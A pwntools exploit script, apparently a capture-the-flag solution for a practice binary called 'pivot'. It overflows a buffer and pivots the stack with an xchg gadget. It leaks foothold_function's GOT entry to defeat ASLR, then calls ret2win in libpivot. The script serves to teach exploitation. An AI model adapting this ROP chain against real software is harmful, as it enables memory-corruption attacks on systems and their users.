import pwn

OFFSET = 40
p = pwn.process('./pivot')
pwn.context.binary = p.elf
libpivot = pwn.ELF("./libpivot.so")

def send_payload(payload):
    p.recvuntil(b"place to pivot:")
    location_to_write = int(p.recvuntil(b'\n').strip(), 16)
    p.sendthen(b"Thank you!\n", payload)

    rop = pwn.ROP(p.elf)
    rop.raw(rop.rax)
    rop.raw(pwn.p64(location_to_write))
    rop.raw(next(rop.elfs[0].search(pwn.asm("xchg rax, rsp; ret"), executable=True)))
    p.sendthen(b"Thank you!\n", (OFFSET * b"A" + rop.chain()))
    return location_to_write

pwn.warning("Stage 1: Call foothold_function (resolves .got)")
rop = pwn.ROP(p.elf)
rop.call(p.elf.plt["foothold_function"])
rop.call(rop.find_gadget(['ret']))
rop.call(p.elf.symbols["main"])
send_payload(rop.chain())

pwn.warning("Stage 2: Leak got's foothold_function")
rop._chain = []
rop.call(p.elf.plt["puts"], [p.elf.got["foothold_function"]])
rop.call(p.elf.symbols["main"])
send_payload(rop.chain())

pwn.warning("Stage 3: Call ret2win (addr(foothold_function) - offset)")
leaked_func = pwn.u64(p.readuntil(b"\n").strip()[-6:].ljust(8, b'\x00'))
libpivot.address = leaked_func - libpivot.symbols['foothold_function']

rop = pwn.ROP(libpivot)
rop.call(libpivot.symbols['ret2win'])
send_payload(rop.chain())

p.stream()
